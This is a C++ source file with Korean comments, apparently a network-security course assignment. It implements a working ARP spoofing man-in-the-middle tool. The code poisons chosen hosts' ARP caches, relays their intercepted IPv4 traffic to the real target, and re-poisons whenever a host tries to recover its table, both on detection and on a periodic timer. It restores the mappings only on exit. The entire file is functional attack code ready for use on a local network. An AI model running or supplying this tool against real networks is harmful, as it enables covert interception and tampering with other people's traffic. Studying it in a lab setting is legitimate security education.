// arp-spoof (gilgil SNS 과제)
// 사용법: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]
//
// 한 (sender, target) 쌍마다:
//   - sender 의 ARP 테이블을 감염시켜서 "target IP = 내(공격자) MAC" 으로 속인다.
//   - 그러면 sender 가 target 으로 보내는 IP 패킷이 나에게로 들어온다 -> 진짜 target 으로 릴레이한다.
//   - sender/target 이 ARP 로 정상 매핑을 복구하려 하면(=recovery) 다시 감염시킨다.
//   - 별도 스레드에서 주기적으로도 재감염한다.
//   - Ctrl+C(SIGINT) 시 정상 MAC 으로 복구시켜 준다.
//
// 양방향(리턴 트래픽까지) MITM 이 필요하면 (t, s) 쌍을 추가로 인자에 넣으면 된다.

#include <cstdio>
#include <cstdint>
#include <cstring>
#include <ctime>
#include <csignal>
#include <atomic>
#include <thread>
#include <chrono>
#include <vector>
#include <string>

#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pcap.h>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct Flow {
    Ip  senderIp;
    Ip  targetIp;
    Mac senderMac;   // 감염 대상(피해자)의 MAC
    Mac targetMac;   // 릴레이해서 보내줄 실제 target 의 MAC
};

// ---- 전역 상태 ----
static pcap_t* g_rx = nullptr;              // 캡처 전용 핸들
static pcap_t* g_tx = nullptr;              // 송신 전용 핸들 (스레드 안전을 위해 분리)
static Mac g_myMac;
static Ip  g_myIp;
static std::vector<Flow> g_flows;
static std::atomic<bool> g_run{true};

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

// ---- 내 인터페이스의 MAC/IP 구하기 ----
bool getMyMac(const char* dev, Mac& mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return false;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { close(fd); return false; }
    close(fd);
    mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
    return true;
}

bool getMyIp(const char* dev, Ip& ip) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return false;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    ifr.ifr_addr.sa_family = AF_INET;
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) { close(fd); return false; }
    close(fd);
    struct sockaddr_in* sin = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
    ip = Ip(ntohl(sin->sin_addr.s_addr));
    return true;
}

// ---- ARP 패킷 하나 전송 (공용 함수) ----
void sendArp(pcap_t* handle,
             Mac ethDmac, Mac ethSmac, uint16_t op,
             Mac arpSmac, Ip arpSip, Mac arpTmac, Ip arpTip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = ethDmac;
    packet.eth_.smac_ = ethSmac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
    packet.arp_.pro_  = htons(EthHdr::Ip4);
    packet.arp_.hln_  = sizeof(Mac);   // MAC 주소 길이 = 6
    packet.arp_.pln_  = sizeof(Ip);    // IP 주소 길이 = 4
    packet.arp_.op_   = htons(op);
    packet.arp_.smac_ = arpSmac;
    packet.arp_.sip_  = htonl(arpSip);
    packet.arp_.tmac_ = arpTmac;
    packet.arp_.tip_  = htonl(arpTip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0)
        fprintf(stderr, "pcap_sendpacket error %d %s\n", res, pcap_geterr(handle));
}

// ---- 특정 IP 의 MAC 을 ARP request 로 알아내기 ----
Mac resolveMac(Ip targetIp) {
    for (int attempt = 0; attempt < 3; ++attempt) {
        // Broadcast ARP request: "who has targetIp? tell g_myIp"
        sendArp(g_tx, Mac::broadcastMac(), g_myMac, ArpHdr::Request,
                g_myMac, g_myIp, Mac::nullMac(), targetIp);

        time_t start = time(nullptr);
        while (time(nullptr) - start < 2) {
            struct pcap_pkthdr* header;
            const u_char* data;
            int res = pcap_next_ex(g_rx, &header, &data);
            if (res != 1) continue;
            if (header->caplen < sizeof(EthArpPacket)) continue;

            EthArpPacket* p = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(data));
            if (p->eth_.type() != EthHdr::Arp) continue;
            if (p->arp_.op()   != ArpHdr::Reply) continue;
            if (p->arp_.sip()  != targetIp) continue;   // sip() 은 이미 host order Ip 로 변환됨
            if (p->arp_.tip()  != g_myIp)   continue;
            return p->arp_.smac_;
        }
    }
    fprintf(stderr, "resolveMac failed for %s\n", std::string(targetIp).c_str());
    exit(-1);
}

// ---- 감염: sender 에게 "targetIp = 내 MAC" 이라고 속임 ----
void infect(const Flow& f) {
    sendArp(g_tx, f.senderMac, g_myMac, ArpHdr::Reply,
            g_myMac, f.targetIp, f.senderMac, f.senderIp);
}

// ---- 복구: sender 에게 진짜 target MAC 을 알려줌(종료 시) ----
void recover(const Flow& f) {
    sendArp(g_tx, f.senderMac, f.targetMac, ArpHdr::Reply,
            f.targetMac, f.targetIp, f.senderMac, f.senderIp);
}

// ---- 주기적 재감염 스레드 ----
void periodicInfect() {
    while (g_run.load()) {
        for (const auto& f : g_flows) infect(f);
        // 1초 대기(무선 loss 대비). 종료 반응성을 위해 잘게 쪼갬.
        for (int i = 0; i < 10 && g_run.load(); ++i)
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

// ---- 메인 루프: 릴레이 + recovery 감지 ----
void relayLoop() {
    while (g_run.load()) {
        struct pcap_pkthdr* header;
        const u_char* data;
        int res = pcap_next_ex(g_rx, &header, &data);
        if (res == 0) continue;                       // timeout
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;
        if (header->caplen < sizeof(EthHdr)) continue;

        EthHdr* eth = reinterpret_cast<EthHdr*>(const_cast<u_char*>(data));

        // 내가 방금 보낸 프레임(감염/릴레이)은 무시 -> 무한루프 방지
        if (eth->smac_ == g_myMac) continue;

        // (1) ARP 패킷: recovery 시도일 수 있으니 관련 flow 재감염
        if (eth->type() == EthHdr::Arp) {
            if (header->caplen < sizeof(EthArpPacket)) continue;
            ArpHdr* arp = reinterpret_cast<ArpHdr*>(const_cast<u_char*>(data) + sizeof(EthHdr));
            Ip sip = arp->sip();
            Ip tip = arp->tip();
            for (const auto& f : g_flows) {
                bool involved =
                    sip == f.senderIp || tip == f.senderIp ||
                    sip == f.targetIp || tip == f.targetIp;
                if (involved) infect(f);
            }
            continue;
        }

        // (2) IPv4 패킷: 감염된 sender 가 내 MAC 으로 보낸 것 -> 진짜 target 으로 릴레이
        if (eth->type() == EthHdr::Ip4) {
            if (eth->dmac_ != g_myMac) continue;      // 나에게 온 것만
            for (const auto& f : g_flows) {
                if (eth->smac_ == f.senderMac) {
                    std::vector<u_char> buf(data, data + header->caplen);
                    EthHdr* e2 = reinterpret_cast<EthHdr*>(buf.data());
                    e2->smac_ = g_myMac;              // src = 나
                    e2->dmac_ = f.targetMac;          // dst = 진짜 target
                    int r = pcap_sendpacket(g_tx, buf.data(), header->caplen);
                    if (r != 0)
                        fprintf(stderr, "relay error %s\n", pcap_geterr(g_tx));
                    break;
                }
            }
        }
    }
}

void onSigint(int) { g_run.store(false); }

int main(int argc, char* argv[]) {
    // 인자: 프로그램명 + interface + (sender,target)쌍들 => 총 개수는 짝수, 최소 4
    if (argc < 4 || (argc % 2) != 0) { usage(); return -1; }

    const char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    g_rx = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (g_rx == nullptr) { fprintf(stderr, "pcap_open_live(%s) rx failed(%s)\n", dev, errbuf); return -1; }
    g_tx = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (g_tx == nullptr) { fprintf(stderr, "pcap_open_live(%s) tx failed(%s)\n", dev, errbuf); return -1; }

    if (!getMyMac(dev, g_myMac)) { fprintf(stderr, "getMyMac failed\n"); return -1; }
    if (!getMyIp(dev, g_myIp))   { fprintf(stderr, "getMyIp failed\n");   return -1; }
    printf("[*] my mac = %s, my ip = %s\n",
           std::string(g_myMac).c_str(), std::string(g_myIp).c_str());

    int pairs = (argc - 2) / 2;
    for (int i = 0; i < pairs; ++i) {
        Flow f;
        f.senderIp  = Ip(std::string(argv[2 + i * 2]));
        f.targetIp  = Ip(std::string(argv[3 + i * 2]));
        f.senderMac = resolveMac(f.senderIp);
        f.targetMac = resolveMac(f.targetIp);
        g_flows.push_back(f);
        printf("[flow %d] sender %s(%s) <- target %s(%s)\n", i,
               std::string(f.senderIp).c_str(),  std::string(f.senderMac).c_str(),
               std::string(f.targetIp).c_str(),  std::string(f.targetMac).c_str());
    }

    signal(SIGINT, onSigint);

    for (const auto& f : g_flows) infect(f);          // 최초 감염
    std::thread infector(periodicInfect);             // 주기 재감염 스레드
    relayLoop();                                      // 릴레이 + recovery 감지

    g_run.store(false);
    infector.join();

    for (const auto& f : g_flows)                     // 종료 시 ARP 테이블 복구
        for (int k = 0; k < 3; ++k) recover(f);

    pcap_close(g_rx);
    pcap_close(g_tx);
    return 0;
}